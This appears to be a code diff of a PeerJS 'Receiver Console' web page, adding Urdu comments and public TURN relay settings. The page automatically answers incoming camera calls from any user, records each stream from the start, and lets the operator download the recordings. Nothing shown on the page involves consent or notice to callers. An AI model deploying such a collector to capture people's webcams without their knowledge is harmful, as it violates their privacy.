@@ -1,11 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Receiver Console</title>
+  
+  <!-- PeerJS لائبریری -->
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
   <style>
+    /* basic reset اور تھیم ڈسپلے */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     
     body, html { 
@@ -29,6 +33,7 @@
       padding: 20px;
     }
 
+    /* اوپر والا لائیو سٹیٹس بار */
     .status-bar {
       font-size: 13px;
       color: #00ff87;
@@ -43,6 +48,7 @@
       display: inline-block;
     }
 
+    /* ویڈیو کارڈز کی گرڈ (Grid Layout) */
     .streams-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -64,7 +70,7 @@
       transition: all 0.4s ease;
     }
 
-    /* Minimize Mode Style */
+    /* کیمرہ بند ہونے پر کارڈ کا چھوٹا (Minimize Taskbar) ہو جانا */
     .glass-card.minimized {
       padding: 10px 14px;
       border-radius: 12px;
@@ -103,6 +109,8 @@
     }
 
     video { width: 100%; display: block; border-radius: 14px; background: #000; transition: filter 0.3s ease; }
+    
+    /* بلر کرنے والی اینیمیشن */
     .video-blurred { filter: blur(25px); }
 
     .controls-bar {
@@ -156,12 +164,29 @@
   </div>
 
   <script>
+    // 1. ایڈمن کی آئی ڈی اور TURN Servers کنفیگریشن
     const peer = new Peer('danish-cam-9988', {
       config: {
         iceServers: [
           { urls: 'stun:stun.l.google.com:19302' },
           { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' }
+          { urls: 'stun:stun2.l.google.com:19302' },
+          { urls: 'stun:global.stun.twilio.com:3478' },
+          {
+            urls: 'turn:openrelay.metered.ca:80',
+            username: 'openrelay',
+            credential: 'openrelay'
+          },
+          {
+            urls: 'turn:openrelay.metered.ca:443',
+            username: 'openrelay',
+            credential: 'openrelay'
+          },
+          {
+            urls: 'turn:openrelay.metered.ca:443?transport=tcp',
+            username: 'openrelay',
+            credential: 'openrelay'
+          }
         ]
       }
     });
@@ -169,22 +194,26 @@
     let totalUserCount = 0;
     let activeUserCount = 0;
 
+    // 2. آن لائن ہونے کا نوٹیفکیشن
     peer.on('open', () => {
       document.getElementById('status').innerText = "Status: Online | Waiting for users...";
     });
 
+    // 3. جیسے ہی نیا یوزر کال کرے گا یہ سگنل ریسیو ہوگا
     peer.on('call', (call) => {
       totalUserCount++;
       activeUserCount++;
       updateMainStatus();
 
-      call.answer();
+      call.answer(); // کال ریسیو کریں
 
       const callId = `User_${totalUserCount}_${Date.now()}`;
 
       call.on('stream', (remoteStream) => {
+        // نئ ویڈیو اسکرین تیار کریں
         createVideoCard(callId, remoteStream, totalUserCount);
 
+        // کیمرہ ڈس کنیکٹ چیکنگ (اگر بندہ پیج بند کرے یا کیمرہ ہٹائے)
         const videoTrack = remoteStream.getVideoTracks()[0];
         if (videoTrack) {
           videoTrack.onended = () => markUserDisconnected(callId);
@@ -194,10 +223,12 @@
       });
     });
 
+    // 4. اوپر والا لائیو اکاؤنٹ اپ ڈیٹ کرنا
     function updateMainStatus() {
       document.getElementById('status').innerText = `Status: Online 🔴 (${activeUserCount} Active Live)`;
     }
 
+    // 5. نئی ویڈیو ونڈو بنانے اور لائیو ریکارڈر آن کرنے کا طریقہ
     function createVideoCard(id, stream, userNumber) {
       const grid = document.getElementById('streamsGrid');
 
@@ -226,6 +257,7 @@
       videoElem.muted = true;
       videoElem.play().catch(err => console.log("Video Play Error:", err));
 
+      // 6. لائیو ویڈیو ریکارڈنگ سیٹ اپ (ہر 1 سیکنڈ بعد ڈیٹا سیو ہوتا رہے گا)
       const chunks = [];
       let options = { mimeType: 'video/webm' };
       if (!MediaRecorder.isTypeSupported('video/webm')) {
@@ -240,11 +272,12 @@
         }
       };
 
-      mediaRecorder.start(1000);
+      mediaRecorder.start(1000); // 1 Second interval
       
       videoElem._recorder = mediaRecorder;
       videoElem._chunks = chunks;
 
+      // 7. لائیو سیکنڈز کا ٹائمر
       let seconds = 0;
       const timerElem = document.getElementById(`timer_${id}`);
       const timerInterval = setInterval(() => {
@@ -257,6 +290,7 @@
       videoElem._timerInterval = timerInterval;
     }
 
+    // 8. کیمرہ بند ہونے پر ونڈو کو ٹاسک بار کی طرح منیمائز (Minimize) کرنا
     function markUserDisconnected(id) {
       const cardElem = document.getElementById(`card_${id}`);
       const videoElem = document.getElementById(`video_${id}`);
@@ -266,7 +300,7 @@
       if (videoElem && videoElem._isDisconnected) return;
       if (videoElem) videoElem._isDisconnected = true;
 
-      // Timer and Recorder Stop
+      // ٹائمر اور ریکارڈر کو اسٹاپ کرنا
       if (videoElem) {
         if (videoElem._timerInterval) clearInterval(videoElem._timerInterval);
         if (videoElem._recorder && videoElem._recorder.state !== "inactive") {
@@ -274,7 +308,7 @@
         }
       }
 
-      // Shrink Card to Taskbar Strip
+      // بڑے کارڈ کو پٹی کی شکل میں منیمائز کرنا
       if (cardElem) {
         cardElem.classList.add('minimized');
       }
@@ -293,11 +327,13 @@
       updateMainStatus();
     }
 
+    // 9. سکرین بلر کرنے کا فنکشن
     function toggleBlur(videoId) {
       const video = document.getElementById(videoId);
       if (video) video.classList.toggle('video-blurred');
     }
 
+    // 10. ویڈیو ڈاؤن لوڈ کا فکسڈ اور ورکنگ فنکشن
     function downloadVideo(id) {
       const videoElem = document.getElementById(`video_${id}`);
       if (!videoElem || !videoElem._chunks || videoElem._chunks.length === 0) {
